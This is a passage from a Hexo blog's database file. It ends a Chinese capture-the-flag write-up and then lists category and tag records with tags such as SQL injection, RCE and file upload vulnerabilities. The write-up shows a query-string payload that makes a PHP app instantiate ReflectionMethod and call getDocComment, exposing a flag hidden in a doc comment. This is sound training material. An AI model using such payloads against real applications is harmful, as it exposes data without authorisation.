class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你能发现我吗string(152) &quot;/** * Increment counter * * @final * @static * @access publicCISCN&#123;uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-&#125; * @return int */&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>题外话：在尝试过程中还发现了另一个类<code>ReflectionClass</code></p>\n<blockquote>\n<p>简介：<strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p>\n</blockquote>\n<p>和上面的那个类对比，两个类研究的对象不一样<strong>ReflectionMethod</strong>研究的是类中的方法，<strong>ReflectionClass</strong> 研究的是类。</p>\n<p>这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckrr3f9ao0008hotc6esihd7c","category_id":"ckrr3f9al0004hotccqfpd9c6","_id":"ckrr3f9ar000fhotccdwyeeeq"},{"post_id":"ckrr3f9af0001hotccrle89hv","category_id":"ckrr3f9al0004hotccqfpd9c6","_id":"ckrr3f9at000jhotc3lwr0cp6"},{"post_id":"ckrr3f9aj0003hotccw2y1mbp","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9av000mhotcgco4a7ok"},{"post_id":"ckrr3f9ar000ehotchd4w30nx","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9ax000photc5nld4i83"},{"post_id":"ckrr3f9an0007hotca2fyh2fq","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9az000thotc5xxl09f6"},{"post_id":"ckrr3f9ao0009hotc7sidgnxm","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9b1000yhotc7ruihjp6"},{"post_id":"ckrr3f9aq000dhotc8cfy89dk","category_id":"ckrr3f9ay000shotcfuqv7z87","_id":"ckrr3f9b30013hotcgqobcz6v"},{"post_id":"ckrr3f9b10010hotc42pd7wo7","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9b40018hotc7k524d9w"},{"post_id":"ckrr3f9at000ihotc4nf8a84p","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9b5001chotc7g4ia3bl"},{"post_id":"ckrr3f9b20012hotcf6k5a6y0","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9b7001ghotcg18c7o0c"},{"post_id":"ckrr3f9b30015hotcag1j4vmv","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9b8001khotc4np262xi"},{"post_id":"ckrr3f9au000khotc9ymrezc8","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9b9001ohotc952hhb2s"},{"post_id":"ckrr3f9b40017hotcgdnng64b","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9bc001rhotc6qjzbhdo"},{"post_id":"ckrr3f9b5001bhotc3kykfkvh","category_id":"ckrr3f9al0004hotccqfpd9c6","_id":"ckrr3f9bd001uhotc6xk24hzo"},{"post_id":"ckrr3f9aw000ohotc0wfc8lqf","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9be001yhotch67112ra"},{"post_id":"ckrr3f9b6001fhotc4919fbdu","category_id":"ckrr3f9ay000shotcfuqv7z87","_id":"ckrr3f9bf0021hotccfrm35nx"},{"post_id":"ckrr3f9b7001jhotcdsna987p","category_id":"ckrr3f9ay000shotcfuqv7z87","_id":"ckrr3f9bg0026hotc5z1tchg5"},{"post_id":"ckrr3f9ay000rhotcgnb2dtay","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9bg0028hotc87sq1g1i"},{"post_id":"ckrr3f9b8001nhotc1pyw41tf","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9bh002ahotc4xcc0tfo"},{"post_id":"ckrr3f9az000whotc7fdda4t6","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9bh002chotc8vyu4frm"},{"post_id":"ckrr3f9b0000xhotc2ez49owo","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9bh002ehotc4rvmho5c"},{"post_id":"ckrr3f9be0020hotc2wpa6n1w","category_id":"ckrr3f9ay000shotcfuqv7z87","_id":"ckrr3f9bi002hhotca3ebb3ll"},{"post_id":"ckrr3f9b9001qhotcfeksex93","category_id":"ckrr3f9bf0023hotcf3f99o1e","_id":"ckrr3f9bi002khotc5zvo3a9u"},{"post_id":"ckrr3f9bc001thotcc6ht38fm","category_id":"ckrr3f9bh002bhotcf0lq014w","_id":"ckrr3f9bj002nhotc1f6269u3"},{"post_id":"ckrr3f9bd001xhotc061mavtg","category_id":"ckrr3f9bf0023hotcf3f99o1e","_id":"ckrr3f9bl002photc5nul144s"},{"post_id":"ckrr3f9bf0025hotcbyuwegq3","category_id":"ckrr3f9bf0023hotcf3f99o1e","_id":"ckrr3f9bl002shotc5quycl7g"},{"post_id":"ckrr3f9bz003thotcc5f204us","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3f9c0003xhotccr9jh83q"},{"post_id":"ckrr3f9bz003uhotc802v6kfl","category_id":"ckrr3f9b1000zhotcgjnsc5m1","_id":"ckrr3f9c0003zhotcav988hj5"},{"post_id":"ckrr3fa5b0041hotc618l2p1c","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckrr3fa5d0043hotc3mu9dql7"},{"post_id":"ckshahdvf0000qwtcd4y42gjc","category_id":"ckrr3f9ap000ahotc63kn91ae","_id":"ckshahdvs0002qwtc6vhfd9oe"}],"PostTag":[{"post_id":"ckrr3f9af0001hotccrle89hv","tag_id":"ckrr3f9am0005hotc6vfad0il","_id":"ckrr3f9aq000chotc9bsucmam"},{"post_id":"ckrr3f9aj0003hotccw2y1mbp","tag_id":"ckrr3f9ap000bhotcagfdcecf","_id":"ckrr3f9ay000qhotc5vqceyzo"},{"post_id":"ckrr3f9aj0003hotccw2y1mbp","tag_id":"ckrr3f9as000hhotc09u72wlq","_id":"ckrr3f9az000uhotcf8ll17ni"},{"post_id":"ckrr3f9an0007hotca2fyh2fq","tag_id":"ckrr3f9av000nhotc7pzvfccb","_id":"ckrr3f9b40019hotc5d0s27xn"},{"post_id":"ckrr3f9an0007hotca2fyh2fq","tag_id":"ckrr3f9az000vhotcgbwc5nq6","_id":"ckrr3f9b6001dhotc2qt7818r"},{"post_id":"ckrr3f9an0007hotca2fyh2fq","tag_id":"ckrr3f9b20011hotca5r6bocx","_id":"ckrr3f9b7001hhotccmei512q"},{"post_id":"ckrr3f9ao0008hotc6esihd7c","tag_id":"ckrr3f9b40016hotc3bs21oif","_id":"ckrr3f9b8001lhotccmf5awqb"},{"post_id":"ckrr3f9ao0009hotc7sidgnxm","tag_id":"ckrr3f9az000vhotcgbwc5nq6","_id":"ckrr3f9bd001vhotc7gi45vlc"},{"post_id":"ckrr3f9ao0009hotc7sidgnxm","tag_id":"ckrr3f9b8001mhotc0ewv33ug","_id":"ckrr3f9be001zhotc3k4vhfut"},{"post_id":"ckrr3f9aq000dhotc8cfy89dk","tag_id":"ckrr3f9bc001shotc8ki028jo","_id":"ckrr3f9bf0024hotcd7mj3439"},{"post_id":"ckrr3f9aq000dhotc8cfy89dk","tag_id":"ckrr3f9am0005hotc6vfad0il","_id":"ckrr3f9bg0027hotc3nbt3sil"},{"post_id":"ckrr3f9ar000ehotchd4w30nx","tag_id":"ckrr3f9bf0022hotca09e03nl","_id":"ckrr3f9bi002ghotcg4a66shu"},{"post_id":"ckrr3f9ar000ehotchd4w30nx","tag_id":"ckrr3f9bg0029hotcd6le0evc","_id":"ckrr3f9bi002ihotcen2pge7a"},{"post_id":"ckrr3f9at000ihotc4nf8a84p","tag_id":"ckrr3f9bh002dhotc501a9sxc","_id":"ckrr3f9bj002mhotc2m0p3sqz"},{"post_id":"ckrr3f9au000khotc9ymrezc8","tag_id":"ckrr3f9bh002dhotc501a9sxc","_id":"ckrr3f9bl002qhotc5tzvgk1x"},{"post_id":"ckrr3f9aw000ohotc0wfc8lqf","tag_id":"ckrr3f9bh002dhotc501a9sxc","_id":"ckrr3f9bl002thotc8w7jhvhr"},{"post_id":"ckrr3f9ay000rhotcgnb2dtay","tag_id":"ckrr3f9bh002dhotc501a9sxc","_id":"ckrr3f9bm002vhotcd0ina9fd"},{"post_id":"ckrr3f9az000whotc7fdda4t6","tag_id":"ckrr3f9bl002uhotc1hu2f212","_id":"ckrr3f9bm002xhotcfugc3wcd"},{"post_id":"ckrr3f9b0000xhotc2ez49owo","tag_id":"ckrr3f9av000nhotc7pzvfccb","_id":"ckrr3f9bn0030hotcfowuhn0u"},{"post_id":"ckrr3f9b0000xhotc2ez49owo","tag_id":"ckrr3f9bm002whotcawnsh7o7","_id":"ckrr3f9bn0031hotcegxjconm"},{"post_id":"ckrr3f9b0000xhotc2ez49owo","tag_id":"ckrr3f9bm002yhotcbr4fbqyh","_id":"ckrr3f9bn0033hotc37l150uc"},{"post_id":"ckrr3f9b10010hotc42pd7wo7","tag_id":"ckrr3f9bm002yhotcbr4fbqyh","_id":"ckrr3f9bn0034hotc0zga8biq"},{"post_id":"ckrr3f9b20012hotcf6k5a6y0","tag_id":"ckrr3f9bn0032hotch2v664nq","_id":"ckrr3f9bo0037hotc6qedge5j"},{"post_id":"ckrr3f9b20012hotcf6k5a6y0","tag_id":"ckrr3f9bn0035hotc9vrcdy0e","_id":"ckrr3f9bp0038hotce8sfd7l9"},{"post_id":"ckrr3f9b30015hotcag1j4vmv","tag_id":"ckrr3f9bn0032hotch2v664nq","_id":"ckrr3f9bp003ahotc07l42uhx"},{"post_id":"ckrr3f9b40017hotcgdnng64b","tag_id":"ckrr3f9av000nhotc7pzvfccb","_id":"ckrr3f9bq003ehotc0ondb0jh"},{"post_id":"ckrr3f9b40017hotcgdnng64b","tag_id":"ckrr3f9bm002whotcawnsh7o7","_id":"ckrr3f9bq003fhotcdwrz2eo7"},{"post_id":"ckrr3f9b40017hotcgdnng64b","tag_id":"ckrr3f9bm002yhotcbr4fbqyh","_id":"ckrr3f9bq003hhotc75wk3mx3"},{"post_id":"ckrr3f9b40017hotcgdnng64b","tag_id":"ckrr3f9bp003chotc1wjmhd86","_id":"ckrr3f9br003ihotcd8pi1v7h"},{"post_id":"ckrr3f9b5001bhotc3kykfkvh","tag_id":"ckrr3f9bq003dhotcfhqah54d","_id":"ckrr3f9bu003khotc0szwfho5"},{"post_id":"ckrr3f9b6001fhotc4919fbdu","tag_id":"ckrr3f9bq003ghotc15fm0ecy","_id":"ckrr3f9bu003lhotcfknvccf8"},{"post_id":"ckrr3f9b7001jhotcdsna987p","tag_id":"ckrr3f9bq003ghotc15fm0ecy","_id":"ckrr3f9bv003nhotc610n5mwn"},{"post_id":"ckrr3f9b8001nhotc1pyw41tf","tag_id":"ckrr3f9bn0032hotch2v664nq","_id":"ckrr3f9bv003photc167ga300"},{"post_id":"ckrr3f9bc001thotcc6ht38fm","tag_id":"ckrr3f9bv003ohotchxie4aeq","_id":"ckrr3f9bv003rhotc1adjgx2n"},{"post_id":"ckrr3f9be0020hotc2wpa6n1w","tag_id":"ckrr3f9bv003qhotcdjah6vtz","_id":"ckrr3f9bw003shotc2sdde7b3"},{"post_id":"ckrr3f9bz003thotcc5f204us","tag_id":"ckrr3f9av000nhotc7pzvfccb","_id":"ckrr3f9c0003vhotcht3z0dtk"},{"post_id":"ckrr3f9bz003thotcc5f204us","tag_id":"ckrr3f9ap000bhotcagfdcecf","_id":"ckrr3f9c0003whotcfyvp4985"},{"post_id":"ckrr3f9bz003thotcc5f204us","tag_id":"ckrr3f9bm002yhotcbr4fbqyh","_id":"ckrr3f9c0003yhotc46wgd0tb"},{"post_id":"ckrr3f9bz003uhotc802v6kfl","tag_id":"ckrr3f9bh002dhotc501a9sxc","_id":"ckrr3f9c00040hotcbckyh0l9"},{"post_id":"ckrr3fa5b0041hotc618l2p1c","tag_id":"ckrr3f9av000nhotc7pzvfccb","_id":"ckrr3fa5d0042hotcgot26k12"},{"post_id":"ckshahdvf0000qwtcd4y42gjc","tag_id":"ckshahdvl0001qwtcb9d1auvj","_id":"ckshahdvt0004qwtc9cwvh83p"},{"post_id":"ckshahdvf0000qwtcd4y42gjc","tag_id":"ckrr3f9bn0032hotch2v664nq","_id":"ckshahdvt0005qwtcg8w72iac"},{"post_id":"ckshahdvf0000qwtcd4y42gjc","tag_id":"ckshahdvs0003qwtc7lo2bks8","_id":"ckshahdvt0006qwtca4qpbe3f"}],"Tag":[{"name":"图床","_id":"ckrr3f9am0005hotc6vfad0il"},{"name":"DMCTF2020","_id":"ckrr3f9ap000bhotcagfdcecf"},{"name":"Misc","_id":"ckrr3f9as000hhotc09u72wlq"},{"name":"Web","_id":"ckrr3f9av000nhotc7pzvfccb"},{"name":"Hackergame 2020","_id":"ckrr3f9az000vhotcgbwc5nq6"},{"name":"代码审计","_id":"ckrr3f9b20011hotca5r6bocx"},{"name":"Https证书","_id":"ckrr3f9b40016hotc3bs21oif"},{"name":"Java安全","_id":"ckrr3f9b8001mhotc0ewv33ug"},{"name":"PicGo上传","_id":"ckrr3f9bc001shotc8ki028jo"},{"name":"反序列化","_id":"ckrr3f9bf0022hotca09e03nl"},{"name":"SSI注入","_id":"ckrr3f9bg0029hotcd6le0evc"},{"name":"文件上传漏洞","_id":"ckrr3f9bh002dhotc501a9sxc"},{"name":"XSS","_id":"ckrr3f9bl002uhotc1hu2f212"},{"name":"BUUCTF_Web","_id":"ckrr3f9bm002whotcawnsh7o7"},{"name":"RCE","_id":"ckrr3f9bm002yhotcbr4fbqyh"},{"name":"sql注入","_id":"ckrr3f9bn0032hotch2v664nq"},{"name":"无列名注入","_id":"ckrr3f9bn0035hotc9vrcdy0e"},{"name":"disable_function绕过","_id":"ckrr3f9bp003chotc1wjmhd86"},{"name":"免费域名","_id":"ckrr3f9bq003dhotcfhqah54d"},{"name":"jsdelivr","_id":"ckrr3f9bq003ghotc15fm0ecy"},{"name":"黑科技","_id":"ckrr3f9bv003ohotchxie4aeq"},{"name":"黑幕实现","_id":"ckrr3f9bv003qhotcdjah6vtz"},{"name":"web","_id":"ckshahdvl0001qwtcb9d1auvj"},{"name":"php原生类","_id":"ckshahdvs0003qwtc7lo2bks8"}]}}